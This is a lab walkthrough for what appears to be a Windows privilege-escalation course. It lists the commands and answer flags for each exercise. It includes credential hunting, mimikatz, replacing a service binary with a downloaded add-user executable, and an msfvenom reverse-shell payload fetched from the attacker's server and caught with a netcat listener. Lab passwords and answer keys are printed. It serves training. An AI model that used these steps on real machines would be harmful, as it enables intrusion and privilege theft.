# Commands to execute  to get flags for labs

### Chapter 16 - Windows Privilege Escalation

**==== 16.1.2 ====**

Q1) Check the users of the local group Remote Management Users on CLIENTWK220 (VM #1). Enter a user which is in this group apart from steve.
  - Use VM #1
  - netcat to machnine `nc <machine ip> 4444`
  - use this command `Get-LocalGroupMember "Remote Management Users"` and the flag should be the username `daveadmin`

Q2) Enumerate the installed applications on CLIENTWK220 (VM #1) and find the flag.
  - Use VM #1
  - netcat to machnine `nc <machine ip> 4444`
  - use this command `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"` and the flag will be in the output

Q3) We'll now use an additional machine, CLIENTWK221 (VM #2), to practice what we learned in this section. Access the machine via RDP as user mac with the password IAmTheGOATSysAdmin!. Identify another member of the local Administrators group apart from offsec and Administrator.
  - Use VM #2
  - xfreerdp to machnine `xfreerdp /u:mac /p:IAmTheGOATSysAdmin! /v:192.168.190.221 /h:650`
  - Start powershell
  - use this command `Get-LocalGroupMember "Administrators"` and the flag should be the username `roy`

Q4) Enumerate the currently running processes on CLIENTWK221 (VM #2). Find a non-standard process and locate the flag in the directory of the corresponding binary file.
  - Use VM #2
  - xfreerdp to machnine `xfreerdp /u:mac /p:IAmTheGOATSysAdmin! /v:192.168.190.221 /h:650`
  - Start powershell
  - use this command to find the proccess name `Get-Process`
  - once the name is identified use this comand to find the binary `Get-Process <proccess name> | Select-Object Path`
  - go to the directory where the exe is and `type flag.txt`

**==== 16.1.3 ====**    

Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
  - Use VM #1
  - rdp to machnine `xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.190.220 /h:650`
  - start powershell
  - use this command ro run powershell as the admin `runas /user:backupadmin powershell` with the password `admin123admin123!`
  - type `type C:\Users\backupadmin\desktop\flag.txt`

Q2) Log into the system CLIENTWK220 (VM #1) via RDP as user steve. Search the file system to find login credentials for a web page for the user steve and enter the password as answer to this exercise.
  - flag is `thisIsWhatYouAreLookingFor`
  - Use VM #1
  - rdp to machnine `xfreerdp /u:steve /p:securityIsNotAnOption++++++ /v:192.168.190.220 /h:650`
  - use this command `Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"` and the flag will be in the output
  - use this command to find txt file`Get-ChildItem -Path C:\Users\steve\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue`
  - type it out

Q3)Connect to CLIENTWK221 (VM #2) via RDP as user mac with the password IAmTheGOATSysAdmin! and locate sensitive information on the system to elevate your privileges. Once found, use the credentials to access the system as this user and find the flag on the Desktop.
  - Use VM #2
  - xfreerdp to machnine `xfreerdp /u:mac /p:IAmTheGOATSysAdmin! /v:192.168.190.221 /h:650`
  - Start powershell
  - use this command to runas another user `run-as /user:richmond powerhshell` and when prompted enter password `GothicLifeStyle1337!`
  - once loged in the flag is on the desktop `type C:\Users\richmond\Desktop\flag.txt`

**==== 16.1.4 ====**  

Q1) Follow the steps above and obtain an interactive shell as daveadmin on CLIENTWK220 (VM #1). Enter the flag, which can be found on the desktop.
  - evil-winrm to machnine `evil-winrm -i 192.168.190.220 -u daveadmin -p "qwertqwertqwert123\!\!"`
  - cd Desktop adn type flag

Q2) Connect to CLIENTWK220 (VM #1) as daveadmin via RDP. Use the Event Viewer to search for events recorded by Script Block Logging. Find the password in these events.
  - flag is `ThereIsNoSecretCowLevel1337`
  - Use VM #1
  - rdp `xfreerdp /u:daveadmin /p:"qwertqwertqwert123\!\!" /v:192.168.190.220 /h:650`
  - use event viewer and filter for event id `4101`
  - find password
    
Q3) Connect to CLIENTWK221 (VM #2) via RDP as user mac with the password IAmTheGOATSysAdmin!. Enumerate the machine and use the methods from this section to find credentials. Utilize them and find the flag. 
  - use VM #2
  - rdp to target `xfreerdp /u:mac /p:IAmTheGOATSysAdmin! /v:192.168.190.221 /h:650`
  - get the history ` type C:\Users\mac\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
  - flag is there

**==== 16.1.5 ====**  

Q1) Follow the steps from this section and examine the output headlined Checking for DPAPI Credential Files. Enter one of the MasterKeys as answer.
  - flag is `7ba528f7-4e73-48a3-8a67-e5680688c9ff`
  - Use VM #1
  - nc into the machine `nc 192.168.190.220 4444`
  - download mimikatz from kali web server and find `DPAPI Credential Files` and it is the `MasterKey` field

Q2) Download a precompiled version of Seatbelt or compile it yourself. To find a precompiled version of Seatbelt, you can enter the search term compiled seatbelt github download in a search engine. Transfer the binary to VM #1 and launch it with the option -group=all. Find a section named InstalledProducts and locate the entry for XAMPP. Enter the value of DisplayVersion as answer to this exercise.
  - flag is `7.4.29-1`
  - Use VM #1
  - follow what it says
    
**==== 16.2.1 ====**  

Q1) Follow the steps outlined in this section on CLIENTWK220 (VM #1) to replace the service binary of the service mysql. Enter the flag, which can be found on the desktop of user daveadmin.
  - Use VM #1
  - use nc `nc 192.168.190.220 4444`
  - on kali, compile the addUser.c with `x86_64-w64-mingw32-gcc Add.c -o adduser.exe` and start a web server
  - on target run `move C:\xampp\mysql\bin\mysqld.exe mysqld.exe`=
  - pull down the binary `wget http://192.168.45.224/adduser.exe -o C:\xampp\mysql\bin\mysqld.exe`
  - restart computer `restart-computer`
  - login to rdp with new user `xfreerdp /u:dave2 /p:password123! /v:192.168.190.220 /h:600` and read flag on `daveadmin` desktop

Q2) Connect to CLIENTWK221 (VM #2) via RDP as user milena with the password MyBirthDayIsInJuly1!. Find a service in which milena can replace the service binary. Get an interactive shell as user running the service and find the flag on the desktop.
  - use VM #2
  - conect with xfreerdp `xfreerdp /u:milena /p:MyBirthDayIsInJuly1! /v:192.168.190.221 /h:600`
  - on kali, create msfvenom payload `msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.224 LPORT=4444 -f exe -o  BackupMonitor.exe` and host on web server
  - on target remove this exe from dir `move C:\BackupMonitor\BackupMonitor.exe .\mysqld.exe`
  - cd to the directory download the file `wget http://192.168.45.224/BackupMonitor.exe -o C:\BackupMonitor\BackupMonitor.exe`
  - set up listener on kali `nc -nlvp 4444`
  - restart computer and listen to kali `restart-computer`
  - flag is  `type C:\Users\roy\desktop\flag.txt`

**==== 16.2.2 ====**  

Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
  - Use VM #1

**==== 16.2.3 ====**  

Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
  - Use VM #1

**==== 16.3.1 ====**  

Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
  - Use VM #1
  - 
**==== 16.2.2 ====**

Q1) Connect to the bind shell (port 4444) on CLIENTWK220 (VM #1) and follow the steps from this section. Find the flag on the desktop of backupadmin.
  - Use VM #1
    
